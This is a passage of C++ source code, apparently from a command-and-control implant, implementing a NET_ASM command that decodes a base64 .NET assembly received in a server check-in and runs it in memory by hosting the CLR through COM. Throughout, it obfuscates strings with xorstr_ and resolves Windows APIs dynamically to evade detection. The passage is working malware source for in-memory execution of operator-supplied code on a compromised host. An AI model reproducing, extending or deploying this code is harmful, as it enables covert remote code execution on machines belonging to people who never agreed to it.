                agent::util::resolve_api<decltype(&SafeArrayPutElement)>(oleaut32, xorstr_("SafeArrayPutElement"));
            ole.safe_array_destroy =
                agent::util::resolve_api<decltype(&SafeArrayDestroy)>(oleaut32, xorstr_("SafeArrayDestroy"));
            if (!ole.complete()) {
                return CommandResult::Error(xorstr_("NET_ASM failed: oleaut32 entry points could not be resolved"));
            }

            ClrSlots slots;
            ComPtr<ICorRuntimeHost> host;
            CommandResult hosted = OpenRuntimeHost(ole, host, slots);
            if (!hosted.success) {
                return hosted;
            }

            ComPtr<IUnknown> app_domain;
            CommandResult domain = OpenDefaultDomain(host.get(), slots, app_domain);
            if (!domain.success) {
                return domain;
            }

            return LoadAndInvoke(app_domain.get(), slots, ole, image, arguments);
        }

        CommandResult ComApartment::Initialize() {
            const HMODULE ole32 = agent::util::get_module(xorstr_("ole32.dll"));
            if (ole32 == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: ole32.dll is unavailable"));
            }
            const auto co_initialize =
                agent::util::resolve_api<decltype(&CoInitializeEx)>(ole32, xorstr_("CoInitializeEx"));
            const auto co_uninitialize =
                agent::util::resolve_api<decltype(&CoUninitialize)>(ole32, xorstr_("CoUninitialize"));
            if (co_initialize == nullptr || co_uninitialize == nullptr) {
                return CommandResult::Error(xorstr_("NET_ASM failed: ole32 entry points could not be resolved"));
            }

            const HRESULT initialized = co_initialize(nullptr, COINIT_APARTMENTTHREADED);
            if (SUCCEEDED(initialized)) {
                uninitialize_ = co_uninitialize;
                return CommandResult::Ok({});
            }
            // RPC_E_CHANGED_MODE: the thread already lives in an apartment, so no CoUninitialize is owed.
            if (initialized == RPC_E_CHANGED_MODE) {
                return CommandResult::Ok({});
            }
            return HresultFailure(xorstr_("CoInitializeEx"), initialized);
        }

    }  // namespace

    CommandResult ExecuteNetAssembly(const CheckinResponse& task) {
        if (task.assembly.empty()) {
            // The dispatcher validates first; this keeps the command honest if called directly.
            return CommandResult::Error(xorstr_("NET_ASM failed: Assembly is required"));
        }

        std::vector<BYTE> image;
        try {
            const std::string decoded = base64::from_base64(task.assembly);
            image.assign(decoded.begin(), decoded.end());
        } catch (const std::exception&) {
            return CommandResult::Error(xorstr_("NET_ASM failed: Assembly is not valid base64"));
        }
        if (image.empty()) {
            return CommandResult::Error(xorstr_("NET_ASM failed: Assembly decoded to an empty image"));
        }

        return RunInClr(image, task.command.arguments);
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
// ========================================== { END OF FILE } ========================================== //
